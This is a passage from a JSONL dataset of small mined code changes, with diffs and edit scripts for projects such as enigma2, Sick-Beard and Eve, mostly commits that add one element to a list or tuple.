eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/crossepg/crossepg.config', '/usr/softcams/'])\n \tconfig.backupmanager.lastlog = ConfigText(default=' ', fixed_size=False)\n \n \tconfig.vixsettings = ConfigSubsection()\n", "before": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/CCcam.cfg' ) , eEnv . resolve ( '${sysconfdir}/CCcam.channelinfo' ) , eEnv . resolve ( '${sysconfdir}/CCcam.providers' ) , eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/crossepg/crossepg.config' , '/usr/softcams/' ] )", "after": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/CCcam.cfg' ) , eEnv . resolve ( '${sysconfdir}/CCcam.channelinfo' ) , eEnv . resolve ( '${sysconfdir}/CCcam.providers' ) , eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/fstab' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/crossepg/crossepg.config' , '/usr/softcams/' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 60, 3, 599], [\"call\", \"N0\"], 9], [\"Insert\", [\"list\", 3, 60, 3, 599], [\",:,\", \"T\"], 10], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:eEnv\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:resolve\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'${sysconfdir}/fstab'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "bcb8ad3be21b0edb864807f74e085dbc9715a288", "parent_sha": "3e227ad0151048611a2a8ba3c7728660fdfdb6a4", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -503,7 +503,7 @@ def InitUsageConfig():\n \tconfig.backupmanager.backupretry = ConfigNumber(default = 30)\n \tconfig.backupmanager.backupretrycount = NoSave(ConfigNumber(default = 0))\n \tconfig.backupmanager.nextscheduletime = NoSave(ConfigNumber(default = 0))\n-\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/CCcam.cfg'), eEnv.resolve('${sysconfdir}/CCcam.channelinfo'), eEnv.resolve('${sysconfdir}/CCcam.providers'), eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/crossepg/crossepg.config', '/usr/softcams/'])\n+\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/CCcam.cfg'), eEnv.resolve('${sysconfdir}/CCcam.channelinfo'), eEnv.resolve('${sysconfdir}/CCcam.providers'), eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/fstab'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/crossepg/crossepg.config', '/usr/softcams/'])\n \tconfig.backupmanager.lastlog = ConfigText(default=' ', fixed_size=False)\n \n \tconfig.vixsettings = ConfigSubsection()\n", "before": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/CCcam.cfg' ) , eEnv . resolve ( '${sysconfdir}/CCcam.channelinfo' ) , eEnv . resolve ( '${sysconfdir}/CCcam.providers' ) , eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/crossepg/crossepg.config' , '/usr/softcams/' ] )", "after": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/CCcam.cfg' ) , eEnv . resolve ( '${sysconfdir}/CCcam.channelinfo' ) , eEnv . resolve ( '${sysconfdir}/CCcam.providers' ) , eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/fstab' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/crossepg/crossepg.config' , '/usr/softcams/' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 60, 3, 599], [\"call\", \"N0\"], 9], [\"Insert\", [\"list\", 3, 60, 3, 599], [\",:,\", \"T\"], 10], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:eEnv\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:resolve\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'${sysconfdir}/fstab'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "d5baa3641b5bda4009c4593fe40844e89a5d631e", "parent_sha": "cdf45f46c174b09ffc4d8351dbffaee6c4bd28bf", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -510,7 +510,7 @@ def InitUsageConfig():\n \tconfig.backupmanager.backupretry = ConfigNumber(default = 30)\n \tconfig.backupmanager.backupretrycount = NoSave(ConfigNumber(default = 0))\n \tconfig.backupmanager.nextscheduletime = NoSave(ConfigNumber(default = 0))\n-\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/CCcam.cfg'), eEnv.resolve('${sysconfdir}/CCcam.channelinfo'), eEnv.resolve('${sysconfdir}/CCcam.providers'), eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/fstab'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/crossepg/crossepg.config', '/usr/softcams/'])\n+\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/CCcam.cfg'), eEnv.resolve('${sysconfdir}/CCcam.channelinfo'), eEnv.resolve('${sysconfdir}/CCcam.providers'), eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/fstab'), eEnv.resolve('${sysconfdir}/ushare.conf'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/crossepg/crossepg.config', '/usr/softcams/'])\n \tconfig.backupmanager.lastlog = ConfigText(default=' ', fixed_size=False)\n \n \tconfig.vixsettings = ConfigSubsection()\n", "before": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/CCcam.cfg' ) , eEnv . resolve ( '${sysconfdir}/CCcam.channelinfo' ) , eEnv . resolve ( '${sysconfdir}/CCcam.providers' ) , eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/fstab' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/crossepg/crossepg.config' , '/usr/softcams/' ] )", "after": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/CCcam.cfg' ) , eEnv . resolve ( '${sysconfdir}/CCcam.channelinfo' ) , eEnv . resolve ( '${sysconfdir}/CCcam.providers' ) , eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/fstab' ) , eEnv . resolve ( '${sysconfdir}/ushare.conf' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/crossepg/crossepg.config' , '/usr/softcams/' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 60, 3, 636], [\"call\", \"N0\"], 11], [\"Insert\", [\"list\", 3, 60, 3, 636], [\",:,\", \"T\"], 12], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:eEnv\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:resolve\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'${sysconfdir}/ushare.conf'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "7dd539d00e932bc10ed4854baaba66f7e1a1831f", "parent_sha": "fc947bb54758b79213da819b83dadae3b424375c", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -511,7 +511,7 @@ def InitUsageConfig():\n \tconfig.backupmanager.backupretry = ConfigNumber(default = 30)\n \tconfig.backupmanager.backupretrycount = NoSave(ConfigNumber(default = 0))\n \tconfig.backupmanager.nextscheduletime = NoSave(ConfigNumber(default = 0))\n-\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/CCcam.cfg'), eEnv.resolve('${sysconfdir}/CCcam.channelinfo'), eEnv.resolve('${sysconfdir}/CCcam.providers'), eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/fstab'), eEnv.resolve('${sysconfdir}/ushare.conf'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/crossepg/crossepg.config', '/usr/softcams/'])\n+\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/CCcam.cfg'), eEnv.resolve('${sysconfdir}/CCcam.channelinfo'), eEnv.resolve('${sysconfdir}/CCcam.providers'), eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/fstab'), eEnv.resolve('${sysconfdir}/ushare.conf'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/ushare.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/crossepg/crossepg.config', '/usr/softcams/'])\n \tconfig.backupmanager.lastlog = ConfigText(default=' ', fixed_size=False)\n \n \tconfig.vixsettings = ConfigSubsection()\n", "before": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/CCcam.cfg' ) , eEnv . resolve ( '${sysconfdir}/CCcam.channelinfo' ) , eEnv . resolve ( '${sysconfdir}/CCcam.providers' ) , eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/fstab' ) , eEnv . resolve ( '${sysconfdir}/ushare.conf' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/crossepg/crossepg.config' , '/usr/softcams/' ] )", "after": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/CCcam.cfg' ) , eEnv . resolve ( '${sysconfdir}/CCcam.channelinfo' ) , eEnv . resolve ( '${sysconfdir}/CCcam.providers' ) , eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/fstab' ) , eEnv . resolve ( '${sysconfdir}/ushare.conf' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/ushare.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/crossepg/crossepg.config' , '/usr/softcams/' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 60, 3, 679], [\"call\", \"N0\"], 21], [\"Insert\", [\"list\", 3, 60, 3, 679], [\",:,\", \"T\"], 22], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:eEnv\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:resolve\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'${sysconfdir}/ushare.conf'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "f5d433dcfa17bfd5d1ba8b7202bcfbd3ebcf44f9", "parent_sha": "c83149673c60dd8a533c8f2bf9975cfb400bbc08", "file_path": "lib/python/Components/UsageConfig.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -579,7 +579,7 @@ def InitUsageConfig():\n \tconfig.backupmanager.backupretry = ConfigNumber(default = 30)\n \tconfig.backupmanager.backupretrycount = NoSave(ConfigNumber(default = 0))\n \tconfig.backupmanager.nextscheduletime = NoSave(ConfigNumber(default = 0))\n-\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/fstab'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/ushare.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/softcams/'])\n+\tconfig.backupmanager.backupdirs = ConfigLocations(default=[eEnv.resolve('${sysconfdir}/enigma2/'), eEnv.resolve('${sysconfdir}/fstab'), eEnv.resolve('${sysconfdir}/hostname'), eEnv.resolve('${sysconfdir}/network/interfaces'), eEnv.resolve('${sysconfdir}/passwd'), eEnv.resolve('${sysconfdir}//etc/shadow'), eEnv.resolve('${sysconfdir}/resolv.conf'), eEnv.resolve('${sysconfdir}/ushare.conf'), eEnv.resolve('${sysconfdir}/inadyn.conf'), eEnv.resolve('${sysconfdir}/tuxbox/config/'), eEnv.resolve('${sysconfdir}/wpa_supplicant.conf'), '/usr/softcams/'])\n \tconfig.backupmanager.lastlog = ConfigText(default=' ', fixed_size=False)\n \n \tconfig.vixsettings = ConfigSubsection()\n", "before": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/fstab' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/ushare.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/softcams/' ] )", "after": "config . backupmanager . backupdirs = ConfigLocations ( default = [ eEnv . resolve ( '${sysconfdir}/enigma2/' ) , eEnv . resolve ( '${sysconfdir}/fstab' ) , eEnv . resolve ( '${sysconfdir}/hostname' ) , eEnv . resolve ( '${sysconfdir}/network/interfaces' ) , eEnv . resolve ( '${sysconfdir}/passwd' ) , eEnv . resolve ( '${sysconfdir}//etc/shadow' ) , eEnv . resolve ( '${sysconfdir}/resolv.conf' ) , eEnv . resolve ( '${sysconfdir}/ushare.conf' ) , eEnv . resolve ( '${sysconfdir}/inadyn.conf' ) , eEnv . resolve ( '${sysconfdir}/tuxbox/config/' ) , eEnv . resolve ( '${sysconfdir}/wpa_supplicant.conf' ) , '/usr/softcams/' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 60, 3, 509], [\"call\", \"N0\"], 11], [\"Insert\", [\"list\", 3, 60, 3, 509], [\",:,\", \"T\"], 12], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:eEnv\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:resolve\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'${sysconfdir}//etc/shadow'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "enigma2", "commit_sha": "0c3468618022ae1cb4540606206dcd4264d638ac", "parent_sha": "3e7514cdc58a066a9b44332b5a7dba1c6639bc31", "file_path": "lib/python/Components/Lcd.py", "project_url": "https://github.com/factorybuild/enigma2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -191,7 +191,7 @@ def standbyCounterChanged(configElement):\n \tconfig.lcd.ledbrightnessdeepstandby.apply()\n \n def InitLcd():\n-\tif getBoxType() in ('gb800se', 'gb800solo','gb800seplus', 'tmsingle', 'vusolo', 'et4x00', 'et5x00', 'et6x00', 'mixosf7', 'mixoslumi'):\n+\tif getBoxType() in ('gb800se', 'gb800solo','gb800seplus', 'tmsingle', 'vusolo', 'et4x00', 'et5x00', 'et6x00', 'mixosf7', 'mixoslumi', 'sf8'):\n \t\tdetected = False\n \telse:\n \t\tdetected = eDBoxLCD.getInstance().detected()\n", "before": "if getBoxType ( ) in ( 'gb800se' , 'gb800solo' , 'gb800seplus' , 'tmsingle' , 'vusolo' , 'et4x00' , 'et5x00' , 'et6x00' , 'mixosf7' , 'mixoslumi' ) : detected = False else : detected = eDBoxLCD . getInstance ( ) . detected ( )", "after": "if getBoxType ( ) in ( 'gb800se' , 'gb800solo' , 'gb800seplus' , 'tmsingle' , 'vusolo' , 'et4x00' , 'et5x00' , 'et6x00' , 'mixosf7' , 'mixoslumi' , 'sf8' ) : detected = False else : detected = eDBoxLCD . getInstance ( ) . detected ( )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 21, 3, 135], [\",:,\", \"T\"], 20], [\"Insert\", [\"tuple\", 3, 21, 3, 135], [\"string:'sf8'\", \"T\"], 21]]"}
{"project": "Sick-Beard", "commit_sha": "4dd5325f94f4735c1b984f254afc56f99d7e3500", "parent_sha": "34b77b6988a3a11df33c57be7a9b6095a0d02831", "file_path": "sickbeard/sab.py", "project_url": "https://github.com/SickBay/Sick-Beard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ def sendNZB(nzb):\n     if nzb.provider == NEWZBIN:\r\n         params['mode'] = 'addid'\r\n         params['name'] = nzb.extraInfo[0]\r\n-    elif nzb.provider in (TVBINZ, NZBS, NZBMATRIX):\r\n+    elif nzb.provider in (TVBINZ, NZBS, NZBMATRIX, TVNZB):\r\n         params['mode'] = 'addurl'\r\n         params['name'] = nzb.url\r\n \r\n", "before": "if nzb . provider == NEWZBIN : params [ 'mode' ] = 'addid' params [ 'name' ] = nzb . extraInfo [ 0 ] elif nzb . provider in ( TVBINZ , NZBS , NZBMATRIX ) : params [ 'mode' ] = 'addurl' params [ 'name' ] = nzb . url", "after": "if nzb . provider == NEWZBIN : params [ 'mode' ] = 'addid' params [ 'name' ] = nzb . extraInfo [ 0 ] elif nzb . provider in ( TVBINZ , NZBS , NZBMATRIX , TVNZB ) : params [ 'mode' ] = 'addurl' params [ 'name' ] = nzb . url", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 26, 3, 51], [\",:,\", \"T\"], 6], [\"Insert\", [\"tuple\", 3, 26, 3, 51], [\"identifier:TVNZB\", \"T\"], 7]]"}
{"project": "CS451", "commit_sha": "92486ccaad221eef070ae58f6ccdf95785211d42", "parent_sha": "87bf4d0abea8d675e976a7f741529e938475a9fd", "file_path": "webserver.py", "project_url": "https://github.com/jlj68/CS451", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -161,7 +161,7 @@ class GameSocketHandler(tornado.websocket.WebSocketHandler):\n                 index2 = 2 if index == 1 else 1\n \n                 gamesList[gameID][index].write_message(tornado.escape.json_encode({'state': gameBoard.state.name, 'updated_board': gamesList[gameID][0].board.getBoardJson()}))\n-                gamesList[gameID][index2].write_message(tornado.escape.json_encode({'function': 'success', 'state': gameBoard.state.name}))\n+                gamesList[gameID][index2].write_message(tornado.escape.json_encode({'function': 'success', 'state': gameBoard.state.name, 'updated_board': gamesList[gameID][0].board.getBoardJson()}))\n \n                 if gameBoard.state == pychess.State.BLACK_WIN or gameBoard.state == pychess.State.WHITE_WIN:\n                     print(\"player win\")\n", "before": "gamesList [ gameID ] [ index2 ] . write_message ( tornado . escape . json_encode ( { 'function' : 'success' , 'state' : gameBoard . state . name } ) )", "after": "gamesList [ gameID ] [ index2 ] . write_message ( tornado . escape . json_encode ( { 'function' : 'success' , 'state' : gameBoard . state . name , 'updated_board' : gamesList [ gameID ] [ 0 ] . board . getBoardJson ( ) } ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 84, 3, 138], [\",:,\", \"T\"], 4], [\"Insert\", [\"dictionary\", 3, 84, 3, 138], [\"pair\", \"N0\"], 5], [\"Insert\", \"N0\", [\"string:'updated_board'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:getBoardJson\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"):)\", \"T\"], 1], [\"Insert\", \"N4\", [\"subscript\", \"N5\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:board\", \"T\"], 2], [\"Insert\", \"N5\", [\"subscript\", \"N6\"], 0], [\"Insert\", \"N5\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N5\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N5\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N6\", [\"identifier:gamesList\", \"T\"], 0], [\"Insert\", \"N6\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N6\", [\"identifier:gameID\", \"T\"], 2], [\"Insert\", \"N6\", [\"]:]\", \"T\"], 3]]"}
{"project": "eve", "commit_sha": "91e5d56f3268007a5c979e5d090470d62ff16967", "parent_sha": "4bfe220f7b4e4b0828c90dca2c3178575956f423", "file_path": "eve/flaskapp.py", "project_url": "https://github.com/stasfilin/eve", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -512,7 +512,7 @@ class Eve(Flask, Events):\n                                                             lookup['url'],\n                                                             lookup['field'])\n                     self.add_url_rule(item_url, view_func=item_endpoint,\n-                                      methods=['GET'])\n+                                      methods=['GET', 'OPTIONS'])\n         self.config['RESOURCES'] = resources\n         self.config['URLS'] = urls\n         self.config['SOURCES'] = datasources\n", "before": "self . add_url_rule ( item_url , view_func = item_endpoint , methods = [ 'GET' ] )", "after": "self . add_url_rule ( item_url , view_func = item_endpoint , methods = [ 'GET' , 'OPTIONS' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 47, 3, 54], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 3, 47, 3, 54], [\"string:'OPTIONS'\", \"T\"], 3]]"}
{"project": "mpepu", "commit_sha": "480d8029da43784e6e664ff3f8b71c64b55ed8e6", "parent_sha": "48222e248f0951211c688ca3a885a34cc1da6caf", "file_path": "bhp056/apps/mpepu_maternal/admin/maternal_consent_admin.py", "project_url": "https://github.com/botswana-harvard/mpepu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -27,7 +27,7 @@ class MaternalConsentAdmin(BaseConsentModelAdmin):\n     def __init__(self, *args, **kwargs):\n         super(MaternalConsentAdmin, self).__init__(*args, **kwargs)\n         # remove these fields from admin fields list, default values should apply\n-        for fld in ['witness_name', 'is_literate', 'guardian_name']:\n+        for fld in ['witness_name', 'is_literate', 'guardian_name', 'language']:\n             self.fields.remove(fld)\n \n admin.site.register(MaternalConsent, MaternalConsentAdmin)\n", "before": "for fld in [ 'witness_name' , 'is_literate' , 'guardian_name' ] : self . fields . remove ( fld )", "after": "for fld in [ 'witness_name' , 'is_literate' , 'guardian_name' , 'language' ] : self . fields . remove ( fld )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 20, 3, 